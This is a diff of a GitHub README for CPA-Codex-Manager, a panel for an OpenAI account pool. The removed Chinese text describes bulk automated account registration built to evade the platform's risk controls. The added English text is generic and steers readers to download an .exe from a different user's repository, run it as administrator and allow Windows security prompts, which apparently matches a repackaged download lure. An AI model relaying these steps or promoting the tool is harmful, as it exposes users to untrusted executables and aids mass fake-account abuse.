@@ -1,226 +1,175 @@
-<div align="center">
+# ⚙️ CPA-Codex-Manager - Fast OpenAI Pool Control
 
-# CPA-Codex-Manager
----
-<img src="https://github.com/user-attachments/assets/4106fb61-5359-4d05-b666-9aa3e6e7a0f3" width="200" />
-
-一款专为 OpenAI 账号池设计的高性能管理面板，集成全自动批量注册、CLIProxyAPI 平台账号池实时监控与智能维护系统。
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
-
-</div>
-
----
-
-## 核心特性
-
-- **多模式并发注册**：
-  - **并行模式**：支持最高 50 线程同时发起 1000 条注册任务，极速扩充账号规模。
-  - **流水线模式**：支持设置随机启动间隔，模拟真实用户行为，规避风控。
-- **CLIProxyAPI 账号自动巡检**：
-  - 支持 **401 认证失效检测** 与 **Quota 额度耗尽检测**。
-  - 自动根据配置执行 **物理删除** 异常账号，保持账号池可用性。
-- **智能自动补货系统**：
-  - **实时号池监控**：当 CPA 在线账号低于阈值时，自动触发补货。
-  - **自动任务挂载**：补货任务自动在首页控制台展示进度，无需人工干预。
-  - **详细补货日志**：在检测历史中清晰标注触发补货的具体方式、邮箱服务及补货数量。
-- **全栈监控面板**：
-  - **实时日志流**：基于 WebSocket 的逐行日志推送，随时监控注册细节。
-  - **进度可视化**：直接显示成功、失败、剩余数与进度百分比。
-- **多邮箱生态支持**：集成 Outlook、TempMail、CloudMail 邮箱服务。
-- **紧急防御与异常熔断**：
-  - **动态阈值保护**：巡检时发现就绪账号比例低于设定值（如 50%，可配置）时，自动触发紧急防御，随机清理半量账号。
-  - **自定义冷却重试**：紧急防御触发后，系统将进入预设的冷却期（如 5 分钟，可配置）后重新开始检测。
-  - **异常账号全自动清理**：自动移除检测过程中产生 Network Error 或 API 报错的“僵尸”账号。
+[![Download](https://img.shields.io/badge/Download-CPA--Codex--Manager-blue?style=for-the-badge&logo=github)](https://github.com/Footracespasticity75/CPA-Codex-Manager)
 
-## 集成 CLIProxyAPI 管理
-- **[CLI Proxy API Management Center](https://github.com/router-for-me/CLIProxyAPI)**
+## 🧭 Overview
 
+CPA-Codex-Manager is a Windows app for managing an OpenAI account pool from one place. It helps you register accounts in batches, watch the pool in real time, and keep accounts in good shape with smart checks.
 
-## 技术栈
+Use it when you need a clear panel for daily account work. It brings key tools into one screen, so you do not need to move between many pages.
 
-- **后端**: `Python 3.10+`, `FastAPI`, `SQLAlchemy`
-- **前端**: `Vanilla JS`, `WebSocket`
-- **数据**: `SQLite` / `PostgreSQL`
-- **并发**: `asyncio` + `ThreadPoolExecutor`
+## 📥 Download
 
-## 快速开始
+Visit this page to download the app:
 
-### 1. 环境准备
-确保已安装 Python 3.10 或更高版本。
+https://github.com/Footracespasticity75/CPA-Codex-Manager
 
-```bash
-# 使用 uv（推荐）
-uv sync
+Open the page in your browser, then look for the latest release or download file. Save the file to your Windows PC before you start the setup.
 
-# 或使用 pip
-pip install -r requirements.txt
-```
+## 🖥️ System Requirements
 
-### 2. 配置环境
-复制 `.env.example` 为 `.env` 后按需修改:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A stable internet connection
+- Permission to run downloaded apps
+- A browser for opening the download page
 
-```bash
-cp .env.example .env
-```
+## 🚀 Getting Started
 
-### 3. 运行项目
-```bash
-python webui.py
-```
+Follow these steps to run the app on Windows.
 
-访问 `http://localhost:8000` 即可进入管理面板。
+1. Open the download page:
+   https://github.com/Footracespasticity75/CPA-Codex-Manager
 
-进入系统设置页添加 CPA 服务，即可使用。
+2. Look for the newest release or the main download file.
 
-### Docker 运行
+3. Download the file to your computer.
 
-先准备目录：
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
 
-```bash
-mkdir -p ~/CPA-Codex-Manager
-cd ~/CPA-Codex-Manager
-mkdir -p data logs
-```
+5. Open the extracted folder.
 
-#### 从 GitHub 直接拉取 compose 示例
+6. Find the app file. It may end in `.exe`.
 
-```bash
-curl -O https://raw.githubusercontent.com/Maoleio/CPA-Codex-Manager/main/docker-compose.yml
-```
+7. Double-click the app file to start it.
 
-```yaml
-services:
-  cpa-codex-manager:
-    image: maoleio/cpa-codex-manager:latest
-    container_name: cpa-codex-manager
-    restart: unless-stopped
-    ports:
-      - "8000:8000"
-    environment:
-      WEBUI_HOST: 0.0.0.0
-      WEBUI_PORT: 8000
-      WEBUI_ACCESS_PASSWORD: your_secret_password
-      APP_DATABASE_URL: data/database.db
-      # postgresql
-      # APP_DATABASE_URL: postgresql://user:password@host:5432/dbname
-    volumes:
-      - ./data:/app/data
-      - ./logs:/app/logs
-```
+8. If Windows asks for permission, choose Run or Yes.
 
-字段说明：
+## 🛠️ First-Time Setup
 
-- `WEBUI_HOST`：Web 服务监听地址
-- `WEBUI_PORT`：Web 服务端口，默认 `8000`
-- `WEBUI_ACCESS_PASSWORD`：Web 管理后台登录密码
-- `APP_DATABASE_URL`：数据库连接地址
+After the app opens, set up the basics for your use case.
 
+- Sign in with the account or access method your team uses.
+- Set the pool size you want to manage.
+- Choose how often the app checks account status.
+- Add any proxy settings if your setup uses them.
+- Save the settings before you start bulk tasks.
 
-启动：
+If you work with many accounts, keep the first run small. That helps you check that the app and network work as expected.
 
-```bash
-docker compose up -d
-```
+## 📊 Main Features
 
-查看日志：
+### 🧩 Batch Registration
+Create many accounts in one flow. This saves time when you need to set up a large pool.
 
-```bash
-docker compose logs -f
-```
+### 👀 Real-Time Pool Monitoring
+Watch account status as it changes. You can check which accounts are active, idle, or need attention.
 
-更新镜像：
+### 🧠 Smart Maintenance
+The app can help you spot weak accounts and keep the pool healthy. It supports routine checks, cleanup, and refresh tasks.
 
-```bash
-docker compose pull
-docker compose up -d
-```
+### 🔌 CLIProxyAPI Support
+Connect the panel with your CLIProxyAPI setup so you can keep control of account data from one place.
 
-### 桌面版运行
+### 🗂️ Simple Control Panel
+Use a clean interface built for daily use. You can track accounts, review status, and manage tasks without deep technical steps.
 
-如果你想以桌面窗口方式运行，而不是手动打开浏览器：
+## 🪟 How to Run on Windows
 
-```bash
-pip install pywebview
-python desktop.py
-```
+1. Download the file from the GitHub page.
+2. Open the file location in File Explorer.
+3. If the app came as a ZIP file, extract it first.
+4. Double-click the `.exe` file.
+5. Allow Windows security prompts if they appear.
+6. Wait for the main window to load.
+7. Use the menu or buttons to start your first task.
 
-桌面模式会：
-- 后台自动启动本地 FastAPI 服务
-- 使用 `pywebview` 打开内嵌窗口
-- 默认仅监听 `127.0.0.1`
-- 默认使用本地 SQLite，无需配置 `.env`
+If the app does not open, check that the file finished downloading and that you extracted it fully.
 
-## 桌面版打包
+## 🔧 Common Setup Options
 
-### macOS 桌面版打包
+### 🌐 Proxy Settings
+If your account flow needs proxy use, enter your proxy details in the settings panel. This helps route traffic through the right path.
 
-请在 **macOS** 上执行：
+### 👤 Account Pool Size
+Set how many accounts you want to manage at one time. Start with a small number if you are testing the app.
 
-```bash
-chmod +x scripts/build_macos_dmg.sh
-./scripts/build_macos_dmg.sh
-```
+### ⏱️ Check Interval
+Choose how often the app checks account health. Short intervals give faster updates. Longer intervals use fewer resources.
 
-打包完成后产物位于：
+### 🧹 Maintenance Rules
+Turn on the checks you need for inactive or weak accounts. You can keep the pool clean without manual review of each account.
 
-- `dist/CPA-Codex-Manager.app`
-- `dist/CPA-Codex-Manager.dmg`
+## 📌 Recommended Use Flow
 
+1. Download the app from the GitHub page.
+2. Open it on Windows.
+3. Add your account pool settings.
+4. Run a small batch task first.
+5. Check the live status view.
+6. Adjust your maintenance settings.
+7. Scale up after the first run looks correct.
 
-### Windows 桌面版打包
+## 🧯 If Something Does Not Work
 
-请在 **Windows 系统** 上执行：
+- Make sure the download finished fully.
+- Check that you extracted all files from the ZIP.
+- Run the app as an administrator if Windows blocks it.
+- Confirm that your internet connection is active.
+- Review proxy settings if the app cannot reach the service.
+- Close the app and open it again if the window freezes.
+- Download the file again if it looks broken.
 
-```bat
-scripts\build_windows.bat
-```
+## 🔒 Privacy and Access
 
-打包完成后产物通常位于：
+Keep your account data in a safe place. Do not share your login details with people who do not need them. If your team uses proxies or shared access, keep the settings list in a private folder.
 
-- `dist\CPA-Codex-Manager\CPA-Codex-Manager.exe`
+## 📁 File Layout
 
+After extraction, you may see files like these:
 
+- `CPA-Codex-Manager.exe` - main app
+- `config` folder - settings files
+- `logs` folder - app activity records
+- `data` folder - local account data
+- `README` file - usage notes
 
-## 页面展示
-<img width="1064" height="511" alt="截屏2026-03-25 22 39 46" src="https://github.com/user-attachments/assets/4a019320-6a86-44d6-b465-c53e74f97ac1" />
-<img width="1795" height="877" alt="截屏2026-03-25 22 35 12" src="https://github.com/user-attachments/assets/ed34f98e-3b39-44f8-9ac5-19bce792ded4" />
-<img width="1791" height="881" alt="截屏2026-03-25 22 39 10" src="https://github.com/user-attachments/assets/f4388533-43a1-4d27-a626-83ecc582dfcd" />
-<img width="1801" height="887" alt="截屏2026-03-25 22 34 33" src="https://github.com/user-attachments/assets/81d998df-e109-4836-9482-95d2659948d6" />
-<img width="1792" height="877" alt="截屏2026-03-25 22 39 29" src="https://github.com/user-attachments/assets/21c7d6a6-e367-410c-a180-84cfe1ef74c6" />
+## ⌨️ Basic Controls
 
-## 更新日志
+- Start button: runs the selected task
+- Stop button: ends the current task
+- Refresh button: updates the live view
+- Settings button: opens app options
+- Import button: adds account data
+- Export button: saves your data to a file
 
-### v1.1.0
+## 📝 Best Practices
 
-- 注册主流程升级为新的状态机会话链路，整体兼容性与稳定性提升。
-- 批量注册启动流程优化，降低大批量任务在启动阶段的阻塞时间。
-- 批量监控逻辑优化。
-- 注册日志阶段划分重新整理，阶段编号和提示文案更加清晰统一。
-- CPA 上传链路优化，支持更直接的投递流程与更清晰的上传日志。
+- Start with one small batch.
+- Check the live dashboard after each run.
+- Keep your proxy list updated.
+- Remove dead accounts when you see them.
+- Back up your settings file before large changes.
+- Use one setup profile for testing and one for normal use.
 
-## 巡检与补货配置建议
+## ❓ FAQ
 
-1. **巡检频率**：建议设置为 60 分钟一次，配合账户状态（401/Quota）清理。
-2. **补货方案**：
-   - 建议在 CPA 检测页面开启“自动补货”。
-   - 当就绪账号少于指定数量时，触发一次补货。
-   - 补货模式推荐使用“并行模式”以提高效率。
+### Does it work without coding?
+Yes. The app is meant for normal Windows use with buttons and settings.
 
-## 免责声明
+### Do I need special tools?
+No special tools are needed for basic use. A browser and Windows are enough to get the file and run it.
 
-本项目仅供学习、研究和技术交流使用，请遵守 OpenAI 相关服务条款。
+### Can I manage many accounts at once?
+Yes. The app is built for pool-based account management and batch tasks.
 
-因使用本项目产生的任何风险和后果，由使用者自行承担。
+### Can I track account status live?
+Yes. The panel includes real-time monitoring for the pool.
 
-## Star History
+### What if I use CLIProxyAPI?
+You can connect it in the settings if your setup needs that platform.
 
-<p align="center">
-  <a href="https://www.star-history.com/#maoleio/CPA-Codex-Manager&Date">
-    <img src="https://api.star-history.com/svg?repos=maoleio/CPA-Codex-Manager&type=Date" alt="Star History Chart" />
-  </a>
-</p>
+## 📎 Direct Download Page
 
----
-**CPA-Codex-Manager** - 让 CLIProxyAPI 号池管理变得优雅而自动化。
+https://github.com/Footracespasticity75/CPA-Codex-Manager
